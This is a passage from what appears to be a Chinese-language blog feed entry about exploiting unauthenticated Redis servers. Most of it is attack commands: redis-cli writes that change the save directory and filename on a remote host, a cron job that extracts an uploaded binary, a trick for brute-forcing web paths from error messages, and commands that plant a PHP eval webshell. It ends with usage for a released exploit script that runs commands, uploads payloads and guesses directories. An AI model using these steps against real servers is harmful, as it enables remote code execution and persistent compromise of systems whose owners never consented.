class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli save -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dir *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename *** -h *.*.*.*</span><br><span class="line">redis-cli<span class="built_in"> config </span><span class="builtin-name">set</span> rdbcompression * -h *.*.*.*</span><br></pre></td></tr></table></figure><p>目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了“|||”作为提取最终文件的标识）。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="number">1</span> * * * * python -c '<span class="keyword">open</span>(<span class="string">"/tmp/rst"</span>,<span class="string">"a+"</span>).<span class="keyword">write</span>(<span class="keyword">open</span>(<span class="string">"/tmp/t"</span>).<span class="keyword">read</span>().split(<span class="string">"|||"</span>)[<span class="number">1</span>])'</span><br></pre></td></tr></table></figure><p>/tmp/rst为最终上传的文件。</p><h2 id="非root权限">非root权限</h2><ul><li>写webshell</li></ul><blockquote><p>tips:<br>当config set dir ‘*’ 设置的目录不存在是会提示目录不存在</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 127.0.0.1:6379&gt;<span class="built_in"> config </span><span class="builtin-name">set</span> dir <span class="string">'/test/'</span></span><br><span class="line">(error) ERR Changing directory: <span class="literal">No</span> such file <span class="keyword">or</span> directory</span><br><span class="line">127.0.0.1:6379&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>可以利用这个特性暴力猜网站目录。</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir <span class="string">'/webpath/'</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename <span class="string">'a.php'</span></span><br><span class="line"><span class="builtin-name">set</span> shell <span class="string">'&lt;?php eval(REQUEST["a"]);?&gt;'</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="enter-hacking">Enter-Hacking</h1><p>以上为手工利用方式，在开始开始理解漏洞是非常有必要，在撸站时候这样就太慢了，所以将以上方法写成了python脚本。</p><p><a href="redis_exp.py">下载链接</a></p><p><a href="https://github.com/00theway/redis_exp" target="_blank" rel="noopener">git地址</a></p><h2 id="使用说明">使用说明</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">执行命令</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">c</span> <span class="string">'id'</span></span><br><span class="line">上传文件</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">l</span> /data/payload.<span class="keyword">py</span> -r /tmp/<span class="keyword">p</span>.<span class="keyword">py</span></span><br><span class="line">暴力猜解目录</span><br><span class="line"><span class="keyword">python</span> redis_exp.<span class="keyword">py</span> --host *.*.*.* -<span class="keyword">f</span> <span class="keyword">p</span>.txt</span><br><span class="line">可以通过-<span class="keyword">p</span>参数更改默认端口，-t参数更改等待时间</span><br></pre></td></tr></table></figure><p>执行命令</p><p><img src="redis_command.png" alt></p><p>路径猜解</p><p><img src="redis_broutefource.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;简介&lt;/h1&gt;
&lt;p&gt;Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;AOF 持久化记录服务器执行的所有写
      
    
    </summary>
    
    
    
      <category term="exploit" scheme="https://www.00theway.org/tags/exploit/"/>
    
      <category term="redis" scheme="https://www.00theway.org/tags/redis/"/>
    
      <category term="unauthenticated" scheme="https://www.00theway.org/tags/unauthenticated/"/>
    
  </entry>
  
</feed>
